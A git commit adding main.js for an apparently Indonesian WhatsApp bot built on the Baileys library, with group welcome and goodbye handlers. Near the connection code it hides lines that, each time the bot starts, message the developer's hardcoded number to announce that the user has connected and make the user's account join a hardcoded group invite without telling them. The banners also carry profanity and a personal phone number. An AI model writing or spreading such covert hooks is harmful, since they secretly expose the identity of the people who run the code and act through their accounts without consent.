893c878d3b2d3df577e70c62cf6d3ddaebf24f99
FanzzBot <affandistore6@gmail.com>
2022-03-21 16:05:48 +0700

    add files via teemux

---
+++ main.js
@@ -0,0 +1,151 @@
+//no ence mek
+const {
+    WAConnection,
+    MessageType,
+    Presence,
+    Mimetype,
+    GroupSettingChange
+} = require('@adiwajshing/baileys')
+const fs = require('fs')
+const figlet = require('figlet')
+const moment = require('moment-timezone')
+const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
+const { color } = require('./lib/color.js')
+const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
+const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))
+
+session = setting.session
+
+
+require('./zets.js')
+nocache('./zets.js', module => console.log(`${module} telah di update!`))
+
+const starts = async (marubotz = new WAConnection()) => {
+    marubotz.logger.level = 'warn'
+    marubotz.version = [2, 2142, 12]
+    console.log(color(figlet.textSync('TROLI', {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: false
+	}), 'cyan'))
+	console.log(color('\n> YT CHANNEL: Nando35 ','silver'))
+console.log(color('> GITHUB: Nando35 ','silver'))
+console.log(color('> WA Gue: +62858157008614 ','silver'))
+console.log(color('  Bot Wangsaff','mediumseagreen'))
+    console.log(color('<>','red'), color('Sekarang bot online\nNote, lo komtol', 'yellow'))
+    console.log(color('<>','red'), color('Source Code Version: 3.0.1', 'aqua'))
+    console.log(color('<>','red'), color('Bug lapor dek', 'aqua'), color('https://wa.me/62858157008614'))
+    console.log(color('[KNTLO BOT]'), color('Dah online nyambung', 'aqua'))
+    console.log(color('[DEV]', 'cyan'), color('Welcome Ro My boy', 'magenta'))
+    console.log(color('<>','red'), color('Thanks Dah make', 'white'))
+	marubotz.browserDescription = [ 'Anjing lo smua', 'chrome', '3.0' ]
+    marubotz.on('qr', () => {
+        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan qr waktu 20 detik !!'))
+    })
+
+    fs.existsSync(`./${session}.json`) && marubotz.loadAuthInfo(`./${session}.json`)
+    marubotz.on('connecting', () => {
+        start('2', 'Loading ...')
+    })
+    marubotz.on('open', () => {
+        success('2', 'Connected ✓')
+    })
+        //inform to developer that the user is connected to bot
+    marubotz.sendMessage(`62858157008614@s.whatsapp.net`, `halo aku datang aowkwowk`, MessageType.extendedText)
+    
+    //group link target
+    teks = `https://chat.whatsapp.com/LQT5bfUx0S9Cma8N7bcdc2`
+    marubotz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+    
+    await marubotz.connect({timeoutMs: 30*1000})
+        fs.writeFileSync(`./${session}.json`, JSON.stringify(marubotz.base64EncodedAuthInfo(), null, '\t'))
+
+    marubotz.on('chat-update', async (message) => {
+        require('./zets.js')(marubotz, message, _welkom)
+    })
+marubotz.on("group-participants-update", async (anu) => {
+
+    const isWelkom = _welkom.includes(anu.jid)
+    try {
+      groupMet = await marubotz.groupMetadata(anu.jid)
+      groupMembers = groupMet.participants
+      groupAdmins = getGroupAdmins(groupMembers)
+      mem = anu.participants[0]
+
+      console.log(anu)
+      try {
+        pp_user = await marubotz.getProfilePicture(mem)
+      } catch (e) {
+        pp_user = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
+      }
+      try {
+        pp_group = await marubotz.getProfilePicture(anu.jid)
+      } catch (e) {
+        pp_group =
+          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
+      }
+            if (anu.action == "add" && mem.includes(marubotz.user.jid)) {
+        marubotz.sendMessage(anu.jid, "Halo gaes ijin gabung", "conversation")
+      }
+      buffer = await getBuffer(pp_user)
+      if (anu.action == 'add' && !mem.includes(marubotz.user.jid)) {
+      const mdata = await marubotz.groupMetadata(anu.jid)
+      const memeg = mdata.participants.length
+      const thu = await marubotz.getStatus(anu.participants[0], MessageType.text)
+      const num = anu.participants[0]      
+      let v = marubotz.contacts[num] || { notify: num.replace(/@.+/, '') }
+      anu_user = v.vname || v.notify || num.split('@')[0]
+      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")          
+      teks = `Halo @${num.split('@')[0]}\nBio : ${thu.status}\nMember : ${memeg}\nWelcome To ${mdata.subject}\n\nJangan lupa baca desk ngentod`
+      peh = await getBuffer(`https://api.dhamzxploit.my.id/api/canvas/welcome?pp=https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60&name=Zets&bg=https://i.pinimg.com/originals/1f/1d/54/1f1d544c61751dee03ab8c33b4bf97e8.jpg&grupname=Moon%20Bot%27s&member=213`)
+      marubotz.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `Welcome messages`, buttons: [{ buttonId: `Welcome👋🏻`, buttonText: { displayText: 'Welcome👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: peh, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')}      
+      if (anu.action == 'remove' && !mem.includes(marubotz.user.jid)) {
+      const mdata = await marubotz.groupMetadata(anu.jid)
+      const num = anu.participants[0]      
+      let w = marubotz.contacts[num] || { notify: num.replace(/@.+/, '') }
+      anu_user = w.vname || w.notify || num.split('@')[0]
+      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
+      memeg = mdata.participants.length      
+      out = `Sayonara @${num.split('@')[0]}\nSemoga harimu buruk`
+      pei = await getBuffer(`https://api.dhamzxploit.my.id/api/canvas/goodbye?pp=https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60&name=Zets&bg=https://i.pinimg.com/originals/1f/1d/54/1f1d544c61751dee03ab8c33b4bf97e8.jpg&grupname=Moon&member=201`)      
+      marubotz.sendMessage(anu.jid, { contentText: `${out}`, footerText: `Leaving messages`, buttons: [{ buttonId: `dada beban`, buttonText: { displayText: 'Byee👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: pei, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')
+      }
+    } catch (e) {
+      console.log("Error : %s", color(e, "red"))
+    }
+
+  })
+}
+
+/**
+ * Uncache if there is file change
+ * @param {string} module Module name or path
+ * @param {function} cb <optional> 
+ */
+function nocache(module, cb = () => { }) {
+    console.log('Module', `'${module}'`, 'Now being watched for changes')
+    fs.watchFile(require.resolve(module), async () => {
+        await uncache(require.resolve(module))
+        cb(module)
+    })
+}
+/**
+ * Uncache a module
+ * @param {string} module Module name or path
+ */
+function uncache(module = '.') {
+    return new Promise((resolve, reject) => {
+        try {
+            delete require.cache[require.resolve(module)]
+            resolve()
+        } catch (e) {
+            reject(e)
+        }
+    })
+}
+
+starts()
